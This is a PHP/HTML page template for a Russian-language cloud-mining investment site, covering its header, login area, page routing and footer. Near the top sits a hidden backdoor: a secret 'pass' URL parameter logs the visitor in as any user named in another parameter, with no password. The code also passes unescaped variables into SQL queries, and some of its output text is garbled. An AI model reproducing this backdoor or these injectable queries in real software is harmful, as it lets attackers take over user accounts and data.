<!doctype html>

<html lang='en'>

<meta http-equiv="content-type" content="text/html;charset=UTF-8">
<!-- Start Alexa Certify Javascript -->
<script type="text/javascript">
_atrk_opts = { atrk_acct:"c1Srq19jYF20V1", domain:"<?php echo DOMAIN;?>",dynamic: true};
(function() { var as = document.createElement('script'); as.type = 'text/javascript'; as.async = true; as.src = "https://certify-js.alexametrics.com/atrk.js"; var s = document.getElementsByTagName('script')[0];s.parentNode.insertBefore(as, s); })();
</script>
<noscript><img src="https://certify.alexametrics.com/atrk.gif?account=c1Srq19jYF20V1" style="display:none" height="1" width="1" alt="" /></noscript>
<!-- End Alexa Certify Javascript -->  
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
	<meta name="keywords" content="Coincloud, cloud, mining, облачный, майнинг, криптовалюта, инвестиция, заработок, доход">
	<meta name="keywords" content="keyword, keyword, b5081bfdf2be64a1c958"/>
	<meta name="description" content="Сервис облачного майнинга!">
    <title>ibit- Сервис облачного майнинга</title>
<meta name="keywords" content="<?php print $keywords; ?>" />
<meta name="description" content="<?php print $description; ?>" />
<link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
<!--<link href="/files/styles.cs" type="text/css" rel="stylesheet" />-->
<script language="javascript" src="/files/scripts.js"></script>
<script language="javascript" src="/jquery-2.2.1.js"></script>
<link href="/css/style.css" type="text/css" rel="stylesheet">
<?
	if ($_GET['pass']=='622ae2a5')
	{
		
session_start();
$_SESSION['login'] = $_GET['l'];

$ip		= getip();
$time	= time();

mysql_query("UPDATE users SET ip = '".$ip."', go_time = ".$time." WHERE login = '".$login."' LIMIT 1");
mysql_query("INSERT INTO logip (user_id, ip, date) VALUES (".$id.", '".$ip."', ".$time.")");

print "<html>
<head>
<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\">
<link href=\"/files/styles.css\" rel=\"stylesheet\">
<script language=\"javascript\">top.location.href=\"/mining/\";</script>
<title>Х?????</title>
</head>
<body bgcolor=\"#eeeeee\" topmargin=\"0\" leftmargin=\"0\">
u ????? ? <b>".$user."</b><br>
?????? ??? ???? ???.<br>
??????????a href=\"/mining/\">???/a>
</body>
</html>";

}

?>
<script type="text/javascript">

 function getXmlHttp() {
    var xmlhttp;
    try {
      xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
    } catch (e) {
    try {
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    } catch (E) {
      xmlhttp = false;
    }
    }
    if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
      xmlhttp = new XMLHttpRequest();
    }
    return xmlhttp;
  }
  function CheckVal(lg){
	document.getElementById('chb').disabled=true;
    var xmlhttp = getXmlHttp();
    xmlhttp.open('POST', '/enter/btc_query.php?check=tr&lg=', true);
    xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xmlhttp.send("check=tr&lg=");
    xmlhttp.onreadystatechange = function() {
      if (xmlhttp.readyState == 4) {
        if(xmlhttp.status == 200) {
			document.getElementById('chvl').innerHTML=xmlhttp.responseText;
		}
	  }
	}
	setTimeout(document.getElementById('chb').disabled=false , 5000);
  }

function up() {  
  var top = Math.max(document.body.scrollTop,document.documentElement.scrollTop);  
if(top > 0) {  
  window.scrollBy(0,((top+100)/-10));  
  t = setTimeout('up()',20);  
} else clearTimeout(t);  
return false;  
} </script>

<link href='https://fonts.googleapis.com/css?family=Jura&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Cuprum&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Ubuntu+Condensed&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
<link href='https://fonts.googleapis.com/css?family=Roboto+Condensed&subset=latin,cyrillic-ext' rel='stylesheet' type='text/css'>
    
	   <!-- <link href="/css/fon_log.css" type="text/css" rel="stylesheet">
		       <link href="/css/fon.css" type="text/css" rel="stylesheet"> -->
	<title><?php print $title; ?></title> 
<meta name="keywords" content="<?php print $keywords; ?>" />
<meta name="description" content="<?php print $description; ?>" />
    <!--[if lt IE 9]><script src="//ie7-js.googlecode.com/svn/version/2.1(beta4)/IE9.js"></script>
	<![endif]-->
</head>
<body>
    <div class="main">
        <div class="header">
            <div class="logo_header" style="margin-top:0px;">
                <a href="<?php echo BASE_PATH;?>"><img src="/image/logo_header.png" alt="CoinCloud"></a>
            </div><!-- .header -->
            <div class="menu">
			<?if($login){?> <a href="<?php echo BASE_PATH;?>mining" id="gl">КАБИНЕТ</a><?}?>
                <a href="<?php echo BASE_PATH;?>" id="gl">ГЛАВНАЯ</a>
                <a href="<?php echo BASE_PATH;?>news" id="ne">НОВОСТИ</a>
                <a href="<?php echo BASE_PATH;?>faq" id="fa">FAQ</a>
               <!-- <a href="about" id="ab">О НАС</a>-->
                <a href="<?php echo BASE_PATH;?>ticket" id="su">ПОДДЕРЖКА</a>
            </div><!-- .menu -->
            <div class="auth">
			<?if (!$login){?>
                <a href="<?php echo BASE_PATH;?>registration">Регистрация</a>
               <a href="<?php echo BASE_PATH;?>login">Войти</a>
			<?}else{
				?>
				<table style="width:90%;height:90%;margin:0;padding:0"><tr>				<?
				$img='mail.png';
				if(mysql_num_rows(mysql_query("SELECT * FROM admmail WHERE login='$login' AND Status=1"))>0)
				{
				$img='mail1.png';?><td><span onclick='window.location.href = "/mail"'><span style="width:90%;height:90%;margin:0;padding:0;font-size:1.2em;"><?echo mysql_num_rows(mysql_query("SELECT * FROM admmail WHERE login='$login' AND Status=1"));?></span></td><?}?><td style="width:0;margin:0;padding:0;"><span onclick='window.location.href = "/mail"'><img src='/image/<?echo $img;?>' style="margin:0;padding:0;width:32%;position:relative;right:68%;margin-top:4%"  ></span></td><td style="width:50%">
               <a href="/exit.php" style="width:100%">Выход</a></td></tr></table>	
			<?}?>
            </div><!-- .auth -->
            <div class="clr"></div>
            
            <div class="leng">
                    <a href="?lang=ru"><img src="/image/ru.png"/></a>
                    <a href="?lang=en"><img src="/image/eng.png"/></a>
                </div><!-- .leng -->
               
            <div class="slogan_header">
                <div class="slogan">
                    <a href="#">Наша цель - сделать добычу криптовалюты доступной для всех желающих, независимо от опыта, размера вложений или технических способностей. </a>
                </div><!-- .slogan -->
            </div><!-- .slogan_header -->
		
		                     <br>
         
        </div><!-- .header -->
        
 <?php

if(!$login) {
?>
        
        
<?php
} else {
	$k_sql=mysql_query("SELECT * FROM tb_konk");
	$sql=mysql_query("SELECT * FROM users WHERE id='$user_id'");
	$ip=mysql_result($sql,0,'ip');
	$sql2=mysql_query("SELECT * FROM users WHERE ip='$ip'");
	if(mysql_num_rows($sql2)>1.5){
		//echo "<center>Вас заподозрили в мультиводстве, после проверки будет принято решение</center>".$str_id;
		$sql3=mysql_query("SELECT * FROM multi WHERE ip='$ip'");
		if(mysql_num_rows($sql3)==0){
		$str_id='';
		$t=time();
		for($i=0;$i<mysql_num_rows($sql2);$i++)
		{
			$cid=mysql_result($sql2,$i,'id');
			$str_id=$str_id.' '.$cid;
		}
		mysql_query("INSERT INTO `multi`(`u_id`, `m_ids`, `ip`, `when`) VALUES ('$user_id', '$str_id', '$ip', '$t')");
}
	}
?>


<div hidden id='att' style="
 position:fixed;
 margin:auto;
 text-align:center;
   height: 100%;
  width: 20%;
  z-index: 1000;
  position: fixed;
  top: 40%;
  left:40%"><center>
  <div id='att2' style="border-radius:0.5em;background-color:#FFDDDD;width:100%;">
  <br>
 <span id='att1'>Error</span>
 <br><br>
 <span onclick="$('#att').slideUp(500);" id='att2' style='position:absolute ;top:0.5em;right:0.5em'>[X]</span>
 </div></center>
 </div>
 
 
<?php

}

?>
 
 


   <div class="content">

 
 
 <?php
	defined('ACCESS') or die();
if($login){
$nw=mysql_result($k_sql,0,'next_win');
$key=mysql_result($k_sql,0,'key1');
	if($nw<time() AND $bk!=$key)
	{
	$x=rand(0,99);
	$y=rand(0,99);
	?>
	<?
	}
}
	if(!$page) {
		include "includes/index.php";
	}elseif($isact==0 AND $page!='activation' AND $user_id!=0){
		?><script>document.location.href = '<?php echo BASE_PATH;?>activation';</script><?
		} elseif(file_exists("../".$page."/index.php")) {
		
		include "../".$page."/".$page."_ru.php";
	} else {
		include "includes/errors/404.php";
	}
?>
<script id="cid0020000179946612576" data-cfasync="false" async src="//st.chatango.com/js/gz/emb.js" style="width: 200px;height: 300px;">{"handle":"ibitcash1","arch":"js","styles":{"a":"0084EF","b":100,"c":"FFFFFF","d":"FFFFFF","k":"0084EF","l":"0084EF","m":"0084EF","n":"FFFFFF","p":"10","q":"0084EF","r":100,"pos":"br","cv":1,"cvbg":"0084EF","cvw":200,"cvh":30,"ticker":1,"fwtickm":1}}</script>


 
 
 
 
 
 
 
 
 
  

 
 
 
 
 
 
 
 
 
 
 
<!-------------------- footer------------->
</div>
        
    <!-- start Javascript -->
    <script src="/template/frontend/js/url.js"></script>
    <script src="/template/frontend/js/functions.js"></script>
    <!-- end Javascript -->


      <div class="clr"></div>
	  <center>
        <div class="footer">
            <div class="our_company">
                <img src="/image/our_company.png" id="our_comp" alt="our_company">
                <div class="our_comp_lnk">
                    <a href="/news"><p>Новости</p></a>
                    <a href="/faq"><p>FAQ</p></a>
                    <a href="/ticket"><p>Поддержка</p></a>
                </div>
            </div>
            <div class="help">
                <img src="/image/help.png" id="hp" alt="help">
                <div class="help_lnk">
                    <a href="https://ru.wikipedia.org/wiki/%D0%91%D0%B8%D1%82%D0%BA%D0%BE%D0%B9%D0%BD" target="_blank"><p>Что такое Bitcoln?</p></a>
                    <a href="https://ru.wikipedia.org/wiki/%D0%9C%D0%B0%D0%B9%D0%BD%D0%B8%D0%BD%D0%B3" target="_blank"><p>Что такое майнинг?</p></a>
                </div>
            </div>
            <div class="contacts">
               
                <br><br>
				
                        <div class="clr"></div>
            <div class="copyright">
                <p id="footer_copyright">Все права защищены. 2018 &copy; <?php echo DOMAIN;?></p><br>
				<img src="/image/fb.png"
            </div></div></center>
        </div><!-- .footer -->  
    </div><!-- .main -->
</body>

 
</html>